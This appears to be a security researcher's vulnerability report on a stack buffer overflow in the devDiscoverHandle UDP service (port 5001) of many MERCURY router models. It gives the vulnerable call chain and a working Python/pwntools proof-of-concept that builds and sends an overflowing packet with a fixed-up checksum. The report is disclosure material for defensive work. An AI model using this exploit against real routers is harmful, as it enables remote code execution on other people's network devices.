# MERCURY Router Vulnerability Report

MERCURY router have a stack overflow issue in `devDiscoverHandle` server.

Any user can get remote code execution through LAN, this vulnerability currently affects latest M, D, B series, including M6G, D12A, B2, MIAP300L, D126, MCAP1200GP, MIAP300D, MWB201, D121G, MWB505, MIAP301D, B5, MIAP300P, M9G, MCAP1200GD, D12, D12B, MWB201S, MIAP303P, MW310RE, MIAP301P, D196G, MW300RE, D19, etc. It affects the linux system and vxworks system. we believe there are much more models suffered from this vuln.

## Vulnerability Description

This vulnerability happen when devDiscoverHandle receive data by using `recvfrom` from `udp port 5001`.Then enter the `protocol_handler`->`parse_advertisement_frame`->`copy_msg_element`.In the function of `copy_msg_element` we can control `a1` and `a3` that It lead to a stack buffer overflow to execute arbitrary code.

![1](devDiscoverHandle/1.png)
![2](devDiscoverHandle/2.png)
![3](devDiscoverHandle/3.png)
![4](devDiscoverHandle/4.png)

## PoC

```python
import sys
import struct
import requests
from pwn import *
from time import sleep


udp_data_addr = 0x0419680

def fix_checksum(data):
    checksum = 0
    for off in range(0, len(data), 2):
        checksum += u16(data[off:off+2])
    checksum &= 0xffffffff
    while True:
        if (checksum >> 0x10) == 0:
            break
        checksum = (checksum & 0xffff) + (checksum >> 0x10)
    checksum &= 0xffff
    return p16(0xffff - checksum)

context.endian='little'

magic = b'\x01\x02\x0e\x00\xe1\x2b\x83\xc7'

gadget1 = p32(udp_data_addr + 0x300)
pad2 = b'poc'.ljust(750-0x10, b'\x00') + gadget1

context.endian='big'
tmp = b'\x00\x05' + p16(len(pad2)) + pad2

checksum = fix_checksum(magic + p16(len(tmp)) + tmp)
payload2 = magic + checksum + p16(len(tmp)) + b'\x00\x00' + tmp

assert(len(payload2) < 0x300)

print('')
print("[*] Sending payload2")
udp=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
udp.sendto(payload2,('192.168.3.28',5001))
udp.close()
sleep(1)
print("[+] Success")

```

